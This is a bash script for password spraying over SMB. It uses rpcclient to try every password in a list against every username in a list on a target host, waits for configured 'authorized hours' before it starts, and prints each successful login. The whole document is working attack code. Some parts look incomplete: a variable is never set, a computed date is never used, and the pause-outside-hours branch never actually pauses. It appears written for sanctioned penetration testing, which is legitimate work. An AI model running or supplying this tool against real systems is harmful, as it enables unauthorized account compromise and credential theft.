#!/bin/bash

# Set the default time check to day
time_check="day"

# Parse command-line arguments
while getopts ":n" opt; do
  case $opt in
    n) time_check="night";;
    \?) echo "Invalid option: -$OPTARG" >&2;;
  esac
done

# Set the start and stop times in 24-hour format
START_TIME=$2
STOP_TIME=$3
USERS=$4
PASSWORDS=$5
SLEEP=$6
HOST=$7
RPCCLIENT=$(which rpcclient)
NMBLOOKUP=$(which nmblookup)
DOMAIN="$($NMBLOOKUP -A $HOST | grep GROUP | head -1 | awk '{print $1}')"

# Set the current time
CURRENT_TIME=$(date +%H%M)

echo "time_check" $time_check "start" $START_TIME "stop" $STOP_TIME 
# Loop until the current time is between argument #1 and #2
if [[ $time_check == "day" ]]; then
  while [[ 10#$CURRENT_TIME -lt 10#$START_TIME || 10#$CURRENT_TIME -ge 10#$STOP_TIME ]]; do
    echo "This is a daytime attack. Currently waiting until authorized hours"
        sleep 300
    CURRENT_TIME=$(date +%H%M)
  done
else
  while [[ ! (10#$CURRENT_TIME -ge 10#$START_TIME && 10#$CURRENT_TIME -lt 10#$STOP_TIME) ]]; do
    echo "This is a overnight attack. Currently waiting until authorized hours"
          sleep 300
    CURRENT_TIME=$(date +%H%M)
  done
fi

# The script will reach this point when the current time is between the authorized hours

# Spray loop
while read PASS; do
    ITR="$((ITR + 1))"
    echo "Current Password:" $PASS
    while read USER; do
        $RPCCLIENT -m="SMB3" -U "${DOMAIN}\\${USER}%${PASS}" "$HOST" -c "getusername; quit" 2>/dev/null
        if [[ $? -eq 0 ]]; then
            echo -en "\e[32m[+]\e[0m "
            echo "${DOMAIN}\\${USER}:${PASS} - LOGON SUCCESS at $(date)"
        fi
    done < <(cat "$USERS")
    CURRENT_TIME=$(date +%H%M)
    if [[ $ITR -lt $LINES ]]; then
        echo -e "\e[33m[+]\e[0m Sleeping ${SLEEP} seconds."
        sleep ${SLEEP}
    fi
    # Check the current time
    if [[ 10#$CURRENT_TIME -lt 10#$START_TIME || 10#$CURRENT_TIME -ge 10#$STOP_TIME ]]; then
        TARGET_DATE=$(date -d "tomorrow $START_TIME" +%s)
        echo "Pausing - outside authorized hours. Will resume spraying again once the system"
fi
done
